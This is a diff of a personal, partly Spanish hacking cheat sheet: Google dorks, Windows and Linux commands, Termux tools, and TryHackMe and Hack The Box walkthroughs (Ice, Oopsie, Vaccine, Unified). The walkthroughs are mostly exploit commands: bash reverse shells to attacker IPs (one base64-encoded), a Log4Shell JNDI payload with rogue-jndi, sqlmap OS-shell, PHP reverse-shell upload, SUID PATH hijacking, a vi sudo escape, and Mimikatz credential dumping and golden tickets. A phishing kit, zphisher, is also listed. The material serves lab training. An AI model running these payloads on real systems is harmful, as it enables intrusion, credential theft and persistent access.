@@ -1,7 +1,7 @@
 
 	DORKS
 
-1. My Favorite Google dork
+1. Fast Google dork
 Start with “site:<domain>”. Then, exclude boring pages with “-www” or other terms until you get to the juicy stuff:
 site:tesla.com -www -shop -share -ir -mfa
 
@@ -20,7 +20,7 @@ site:tesla.com ext:php inurl:?
 Look through both fixed and unfixed bug bounties publicly disclosed through OpenBugBounty:
 site:openbugbounty.org inurl:reports intext:"yahoo.com"
 
-4. Combine your dorks
+4. Combine dorks
 Use the “|” operator to include both queries or the “&” operator to require both queries. Here’s an example of attempting to search for file upload endpoints across multiple domains:
 (site:tesla.com | site:teslamotors.com) & ”choose file”
 --------------------------------------------------------------------
@@ -37,15 +37,86 @@ get-date will provide the date from the Windows file system and wsl date will pr
 wsl pwd
 wsl.exe (Open default installed)
 
-
 If we have an error with wsl or the reboot
 Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux.
+
+route print
+----------------------------------------------------------------
+	WINDOWS (General)
+
+tree
+ipconfig/  or /all
+ncpa.cpl
+netstat or -n :Protocolo, direcciones, estado de las conexiones
+nslookup: descubrir las direcciones IP de cualquier nombre de dominio
+
+
+ipconfig - Muestra información de la configuración IP / /all, /releasey /renew. /// ipconfig /release liberará los enlaces DHCP actuales. ipconfig /renew solicitará información de configuración actualizada del servidor DHCP.
+ping - Prueba las conexiones con otros hosts IP
+netstat - Muestra las conexiones de red
+tracert - Muestra la ruta exacta recorrida hasta el destino
+nslookup - Directamente solicita al servidor de nombres información sobre un dominio de destino
+ipconfig /flushdns harán que el adaptador vacíe el caché de DNS
+ipconfig /displaydns mostrará la información de DNS en el caché.
+
+netsh wlan show profile NombreWifi key=clear
 
 ----------------------------------------------------------------
 	LINUX (General)
 
-uname -a
+type: categoria del comando
+uname -a : all info KERNEL
+uname -r :muestra el número del kernel de la versión de Linux actual.
 hostname -I
+man -f: short description of command
+locate archivo
+cat /etc/issue: version de distribucion
+cat /etc/os-release
+lsb_release -d :muestra la distribución y el número de versión actual.
+getuid
+sysinfo
+getprivs
+echo "Y2FSYw==" | base64 -d
+sudo find / -type f -name probando.pdf /// OR find / iname "apache2. conf"  
+screenfetch & neofetch (alldistros)
+sudo setxkbmap --- /etc/locale.gen :keyboard language
+
+sudo systemctl status zabbix-server.service
+systemctl | grep running
+service networking restart
+service NetworkManager restart
+
+
+
+------
+	TERMUX
+apt install sl cmatrix figlet cowsay
+git clone https://github.com/Vampysecurity2/Lucifer.git
+---
+customized shell:
+/usr/etc: rm -rf motd
+vim bash.bashrc
+
+setterm -foreground blue
+echo "************************"
+
+setterm -foreground red
+cowsay Hack The Planet
+setterm -foreground green
+figlet -f big vampy
+
+setterm -foreground blue
+echo "************************"
+bash: to see the new shell
+---
+ssh -R 80:localhost:8080 nokey@localhost.run
+exiftool
+zphisher
+	NETHUNTER
+nh
+nh -r
+psswd: kali
+
 ----------------------------------------------------------------
 	TryHackme
 
@@ -79,11 +150,20 @@ john --show --format=NT /home/kali/pass.hash
 hashcat -a 0 -m 1000 --username pass.hash /usr/share/wordlists/rockyou.txt --force --show
 https://crackstation.net/
 
-	Find flags! 
-
+	Find flags!
+ 
 type filename :IMPRIME CONTENIDO DESDE WSHELL
 search -f flag*.txt
 
+
+	*ICE - Windows machine*
+
+Recon*: -sV --- icecast --- hostname DARK-PC
+Gain Acces*: https://www.cvedetails.com/ --- What type of vulnerability is it?: execute code overflow --- CVE-2004-1561 --- search icecast --- exploit/windows/http/icecast_header -- run
+Escalate*: getuid --- sysinfo --- x64 --- run post/multi/recon/local_exploit_suggester --- exploit/windows/local/bypassuac_eventvwr --- getprivs --- What permission listed allows us to take ownership of files?: SeTakeOwnershipPrivilege
+Looting*: ps --- In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) --- spoolsv.exe --- migrate 1272 --- getuid:NT AUTHORITY\SYSTEM --- load kiwi (Kiwi is the updated version of Mimikatz) --- help --- creds_all
+Post-Exploitation*: hashdump --- what command allows us to watch the remote user's desktop in real time?: screenshare --- record_mic --- To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this?: timestomp --- Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this?: golden_ticket_create --- Golden ticket attacks are a function within Mimikatz which abuses a component to Kerberos (golden ticket attacks allow us to maintain persistence and authenticate as any user on the domain.) --- As we have the password for the user 'Dark' we can now authenticate to the machine and access it via remote desktop (MSRDP)--- If this hasn't already been enabled, we can enable it via the following Metasploit module: `run post/windows/manage/enable_rdp`
+Extra Credit*: Explore manual exploitation via exploit code found on exploit-db.  Exploit link: https://www.exploit-db.com/exploits/568 ---As you advance in your pentesting skills, you will be faced eventually with exploitation without the usage of Metasploit. Provided above is the link to one of the exploits found on Exploit DB for hijacking Icecast for remote code execution. While not required by the room, it's recommended to attempt exploitation via the provided code or via another similar exploit to further hone your skills.
 ------------------------------------------------------
 	Hack The Box
 settarget ip
@@ -275,3 +355,31 @@ As this is a normal user account as well as a service account, it is worth check
 or executed commands. To do that, we will read the PowerShell history file, which is the equivalent of
 .bash_history for Linux systems. The file ConsoleHost_history.txt can be located in the directory
 C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ --- copy admin password --- python3 psexec.py administrator@10.129.148.88 (SINCE impacket/examples) --- rootflag (root.txt on Users/Administrator)
+
+OOPSIE
+Enumeration***
+With what kind of tool can intercept web traffic? : Proxy --- Burp Suite --- Web crawling or spidering --- cdn-cgi/login --- (see user value with ispect q) --- http://10.129.95.191/cdn-cgi/login/admin.php?content=accounts&id=1
+http://10.129.75.149/cdn-cgi/login/admin.php?content=accounts&id=2 (TEST WITH 1 TO GET ID USER) --- Branding Image Uploads --- use admin value to modify the request --- For this exercise we are going to use the /usr/share/webshells/php/php-reverse-shell.php
+ What can be modified in Firefox to get access to the upload page? : cookie --- upload reverse shell.php --- gobuster dir --url http://{TARGET_IP}/ --wordlist/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
+The gobuster immediately found the /uploads directory. We don't have permission to access the directory but we can try access our uploaded file --- nc -lvnp 1234 --- Then request our shell through the browser --- http://{TARGET_IP}/uploads/php-reverse-shell.php --- We got a reverse shell! In order to have a functional shell though we can issue the following
+python3 -c 'import pty;pty.spawn("/bin/bash")' ---  Lateral Movement*****
+After some search we can find some interesting php files under /var/www/html/cdn-cgi/login directory. --- cat * | grep -i passw* --- cat /etc/passwd --- Unfortunately, that wasn't the password for user robert . Let's read one by one the files now. We are going to start with db.php which seems interesting: cat db.php -- su robert
+Privilege Escalation*** --- sudo -l --- id --- We observe that user robert is part of the group bugtracker . Let's try to see if there is any binary within that group --- find / -group bugtracker 2>/dev/null --- We found a file named bugtracker . We check what privileges and what type of file is it:ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
+Commonly noted as SUID (Set owner User ID), the special permission for the user access level has a single function: A file with SUID always executes as the user who owns the file, regardless of the user passing the command. If the file owner doesn't have execute permissions, then use an uppercase S here. In our case, the binary 'bugtracker' is owned by root & we can execute it as root since it has SUID set.
+We will run the application to observe how it behaves: /usr/bin/bugtracker --- The tool is accepting user input as a name of the file that will be read using the cat command, however, it does not specifies the whole path to file cat and thus we might be able to exploit this. We will navigate to /tmp directory and create a file named cat with the following content: /bin/sh
+chmod +x cat --- export PATH=/tmp:$PATH --- echo $PATH --- Finally execute the bugtracker from /tmp directory: bugtracker :2 --- cd /root --- sudo cat root.txt
+ What executible is run with the option "-group bugtracker" to identify all files owned by the bugtracker group? : find ---  What is the name of the executable being called in an insecure manner? :Cat
+
+VACCINE
+Enumeration** ftp ip --- anon123 --- In order to successfully crack the password, we will have to convert the ZIP into the hash using the zip2john module that comes within John the Ripper: zip2john backup.zip > hash.txt --- john -wordlist=/usr/share/wordlists/rockyou.txt hashes --- 741852963 --- see index.php --- hashid 2cb42f8734ea607eefed3b70af13bbd3 --- echo '2cb42f8734ea607eefed3b70af13bbd3' > hash --- hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt --- now we can acces to the page with: admin & cracked password --- intercept a cookie with burp suite or with cookie-editor
+Foothold** The cookies in HTTP messages of requests are usually set the following way: PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1 --- sqlmap -u 'http://10.129.195.100/dashboard.php?search=any+query' --cookie="PHPSESSID=bbllqcug67jh7g0cl0m1qskeep"  --- sqlmap -u 'http://10.129.195.100/dashboard.php?search=any+query' --cookie="PHPSESSID=bbllqcug67jh7g0cl0m1qskeep" --os-shell --- We got the shell, however, it is not very stable & interactive. To make it much stable, we will use the following payload:bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1" --- but first: sudo nc -lvnp 443 --- We got the foothold. We will quickly make our shell fully interactive:
+python3 -c 'import pty;pty.spawn("/bin/bash")' --- Privilege escalation** We will try to find the password in the /var/www/html folder --- dashboard.php --- ssh postgres@10.129.95.174 --- Privilege escalation** sudo -l -- So we have sudo privileges to edit the pg_hba.conf file using vi by running sudo /bin/vi/etc/postgresql/11/main/pg_hba.conf . We will go to GTFOBins to see if we can abuse this privilege: https://gtfobins.github.io/gtfobins/vi/#sudo --- sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf -c ':!/bin/sh'/dev/null --- sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf --- Now we will press the : button to set the instructions inside Vi --- :set shell=/bin/sh
+Next, we will open up the same instruction interface & type the following: :shell --- Note: Type bash to switch to /bin/bash shell --- cd /root
+
+UNIFIED
+Enumeration**  sudo nmap -sC -sV -v 10.129.202.82 --- https://10.129.202.82:8443/manage/ --- CVE-2021-44228 --- This Log4J vulnerability can be exploited by injecting operating system commands (OS Command Injection) --- To determine if this is the case, we can use FoxyProxy after making a POST request to the /api/login endpoint, to pass on the request to BurpSuite, which will intercept it as a middle-man --- test:test --- Exploitation** ctrl +r --- We input the payload into the remember field as shown above so that we can identify an injection point if one exists. If the request causes the server to connect back to us, then we have verified that the application is vulnerable. --- "${jndi:ldap://{Tun0 IP Address}/whatever}" --- JNDI is the acronym for the Java Naming and Directory Interface API
+LDAP PORT: 389 --- After we hit "send" the "Response" pane will display the response from the request. The output shows us an error message stating that the payload is invalid, but despite the error message the payload is actually being executed. --- Let's proceed to starting tcpdump on port 389 , which will monitor the network traffic for LDAP connections. --- sudo tcpdump -i tun0 port 389 --- Send again --- we will have to install Open-JDK and Maven on our system in order to build a payload that we can send to the server and will give us Remote Code Execution on the vulnerable system --- $ sudo apt-get install maven $ git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package --- Open-JDK is the Java Development kit, which is used to build Java applications. Maven on the other hand is an Integrated Development Environment (IDE) that can be used to create a structured project and compile our projects into jar files 
+These applications will also help us run the rogue-jndi Java application, which starts a local LDAP server and allows us to receive connections back from the vulnerable server and execute malicious code.--- Once we have installed the required packages, we now need to download and build the Rogue-JNDI Java application --- echo 'bash -c bash -i >&/dev/tcp/10.10.14.42/4444 0>&1' | base64 --- java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuNDIvNDQ0NCAwPiYxCg==}| {base64,-d}|{bash,-i}" --hostname "10.10.14.42" --- nc -lvp 4444 --- Going back to our intercepted POST request, let's change the payload to --- ${jndi:ldap://10.10.14.42:1389/o=tomcat} --- script /dev/null -c bash --- 
+Privilege Escalation** ps aux | grep mongo --- mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);" --- mkpasswd -m sha-512 Password1234 --- mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"PASTEHASHCREATED"}})' --- mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);" --- Let's now visit the website and log in as administrator . It is very important to note that the username is case sensitive. --- settings -> site --- ssh root@10.129.96.149
+ What protocol does JNDI leverage in the injection?: LDAP --- What tool do we use to intercept the traffic, indicating the attack was successful? : TCPDUMP --  What port is the MongoDB service running on? : 27117 ---  What is the default database name for UniFi applications? :ace ---  What is the function we use to enumerate users within the database in MongoDB? : db.admin.find() & FOR UPDATE:  db.admin.update() --- 
+
